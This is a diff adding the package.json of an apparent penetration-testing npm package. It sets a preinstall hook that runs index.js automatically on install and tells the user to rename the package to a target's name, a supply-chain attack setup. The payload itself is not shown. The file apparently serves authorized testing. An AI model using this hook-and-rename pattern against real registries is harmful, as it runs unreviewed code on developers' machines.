@@ -1,0 +1,12 @@
+{
+  "name": "supplyshark-poc-rce",
+  "version": "1.3.37",
+  "description": "PoC npm package: demonstrates code execution at install time. AUTHORIZED ENGAGEMENTS ONLY - rename to the target name before use.",
+  "main": "index.js",
+  "bin": { "rce-proof": "index.js" },
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node index.js"
+  },
+  "license": "MIT"
+}
